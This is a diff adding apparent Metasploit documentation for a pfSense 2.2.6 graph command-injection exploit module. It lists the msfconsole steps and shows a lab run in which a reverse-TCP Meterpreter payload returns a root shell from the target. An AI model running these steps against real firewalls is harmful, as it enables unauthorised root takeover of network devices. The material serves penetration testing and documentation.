@@ -1,0 +1,54 @@
+Verification Steps
+
+Start msfconsole
+Do: use exploit/unix/http/pfsense_graph_injection_exec
+Do: set RHOST [IP]
+Do: set USERNAME [username]
+Do: set PASSWORD [password]
+Do: set LHOST [IP]
+Do: exploit
+Scenarios
+
+pfSense Community Edition 2.2.6-RELEASE
+
+msf exploit(unix/http/pfsense_graph_injection_exec) > options 
+
+Module options (exploit/unix/http/pfsense_graph_injection_exec):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD  pfsense          yes       Password to login with
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST     192.168.75.132   yes       The target address
+   RPORT     443              yes       The target port (TCP)
+   SSL       true             no        Negotiate SSL/TLS for outgoing connections
+   USERNAME  admin            yes       User to login with
+   VHOST                      no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.75.128   yes       The listen address
+   LPORT  80               yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf exploit(unix/http/pfsense_graph_injection_exec) > exploit
+
+[*] Started reverse TCP handler on 192.168.75.128:80 
+[*] Detected pfSense 2.2.6-RELEASE, uploading intial payload
+[*] Triggering the payload, root shell incoming...
+[*] Sending stage (37543 bytes) to 192.168.75.132
+[*] Meterpreter session 1 opened (192.168.75.128:80 -> 192.168.75.132:34381) at 2018-01-01 02:07:03 -0600
+
+meterpreter > getuid
+Server username: root (0)
+meterpreter > 
